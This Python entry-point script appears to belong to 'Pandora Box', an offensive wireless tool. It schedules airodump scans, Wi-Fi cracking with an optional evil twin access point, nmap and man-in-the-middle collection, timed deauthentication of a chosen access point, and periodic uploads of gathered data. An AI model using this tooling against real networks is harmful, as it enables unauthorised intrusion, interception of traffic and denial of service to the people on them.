import os
import re
import time
import argparse
import schedule
from datetime import datetime, timedelta
from pandora.config import SCHEDULE_AIRODUMP, SCHEDULE_MITM, SCHEDULE_UPLOAD, UPLOAD
# from pandora.config import SCHEDULE_NMAP
from pandora.utils.exceptions import ProgramNotFoundError
try:
    from pandora.core import ifmanager, jobs, crack, recollect
    from pandora.shell import airmon
    
except ProgramNotFoundError as error:
    print(error)
    exit(1)

def main():
    args = get_args()
    mode = args.mode
    ifname = args.interface
    ifname_hostapd = args.interface2
    eviltwin = args.eviltwin

    #Showing figlet output
    banner()

    #Configuring interface to monitor mode.
    interface_manager = ifmanager.InterfaceManager()
    if mode == 'discover' or mode == 'intrusion' or mode == 'deauth':
        interface_manager.kill_conflicting_processes()
        interface = interface_manager.switch_mode(ifname, 'Monitor')
    else:
        interface = interface_manager.get_interface_by_name(ifname)
    if interface is None:
        print("The interface couldn't be set to Monitor Mode")
        exit(1)
    print(f"Executing Pandora Box in mode {mode}")
    #Scheduling Tasks
    ifname = interface.get('iname')
    netmask = interface.get('netmask')
    ipv4 = interface.get('ipv4')
    if mode == 'discover':
        #jobs.airodump_job(interface.get('iname'), 10)
        schedule.every(SCHEDULE_AIRODUMP).minutes.do(jobs.airodump_job, interface.get('iname'), 10)
        schedule_upload()
    elif mode == 'intrusion':
        status_code = crack.crack_tree(interface.get('iname'), eviltwin=eviltwin, ifname_hostapd=ifname_hostapd)
        if status_code == -1:
            print("Cracking failed.")
        else:
            print("Cracking was successful.")
        exit(0)
    elif mode == 'recollect':
        recollect.nmap_job(ipv4, netmask, ifname)
        recollect.mitm_job(ipv4, netmask, ifname)
        #schedule.every(SCHEDULE_NMAP).minutes.do(recollect.nmap_job, ipv4, netmask, ifname)
        schedule.every(SCHEDULE_MITM).minutes.do(recollect.mitm_job, ipv4, netmask, ifname)
        schedule_upload()
    elif mode == 'deauth':
        adump_duration = 20
        scheduled_datetime = args.datetime - timedelta(seconds=adump_duration)
        targetmac = args.targetmac
        now = datetime.now()
        delta = scheduled_datetime - now
        desired_time = scheduled_datetime.strftime("%H:%M:%S")
        remaining_days = delta.days
        print(f"Time until deauth is {remaining_days} days at {desired_time}")
        schedule.every(remaining_days).days.at(desired_time).do(jobs.deauth_job, targetmac, interface.get('iname'), adump_duration, schedule)
        #schedule.every().day.at(desired_time).do(jobs.deauth_job, targetmac, interface.get('iname'), schedule)

    while 1:
        schedule.run_pending()
        time.sleep(1)

def get_args():
    available_modes = ['discover', 'intrusion', 'recollect', 'deauth']

    parser = argparse.ArgumentParser(
        description='Pandora',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    interface_choices = get_interfaces()

    parser.add_argument('-m',
                        '--mode',
                        help='Select operation mode',
                        choices=available_modes,
                        default='discover')

    parser.add_argument('interface',
                        choices=interface_choices,
                        help='Uses this wireless network interface as main interface for performing attacks')

    parser.add_argument('-it2',
                        '--interface2',
                        choices=interface_choices,
                        help='Uses this wireless network interface for hostapd')

    parser.add_argument('-et',
                        '--eviltwin',
                        help='Use evil twin',
                        action='store_true')

    parser.add_argument('-tmac',
                        '--targetmac',
                        type=validate_targetmac,
                        help='Target MAC of Access Point to deauthenticate',
                        )

    parser.add_argument('-dt',
                        '--datetime',
                        type=validate_datetime,
                        help='Datetime to deauthenticate target MAC. Example: 31/12/20-18:00',
                        )
    args = parser.parse_args()

    if args.interface == args.interface2:
        parser.error("interface and interface2 must be different devices.")

    if args.mode == 'deauth' and (args.datetime is None or args.targetmac is None):
        parser.error("--mode deauth requires --datetime and --targetmac.")

    return args

def get_interfaces():
    airmonobj = airmon.Airmon()
    interfaces_tup = airmonobj.get_interfaces()
    interfaces = []
    for interface_tup in interfaces_tup:
        interfaces.append(interface_tup[1])
    return interfaces


def validate_datetime(dt):
    msg = "No a valid datetime"
    try:
        return datetime.strptime(dt, "%d/%m/%y-%H:%M") #%z
    except ValueError:
        print(dt)
        msg = "Not a valid datetime: '{0}'\nExample: 31/12/20-18:00.".format(dt) #+0000
        raise argparse.ArgumentTypeError(msg)

def validate_targetmac(addr):
    if re.match("[0-9a-f]{2}([:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", addr.lower()):
        return addr
    else:
        msg = "Not a valid ip address: '{0}'.".format(addr)
        raise argparse.ArgumentTypeError(msg)
    # try:
    #     return ipaddress.ip_address(addr)
    # except ValueError:
    #     msg = "Not a valid ip address: '{0}'.".format(addr)
    #     raise argparse.ArgumentTypeError(msg)

def schedule_upload():
    if UPLOAD:
        schedule.every(SCHEDULE_UPLOAD).minutes.do(jobs.upload_job)

def banner():
    banner_msg = """
    ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗     ██████╗  ██████╗ ██╗  ██╗
    ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚██╗██╔╝
    ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║    ██████╔╝██║   ██║ ╚███╔╝ 
    ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║    ██╔══██╗██║   ██║ ██╔██╗ 
    ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║    ██████╔╝╚██████╔╝██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
"""
    print(banner_msg)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
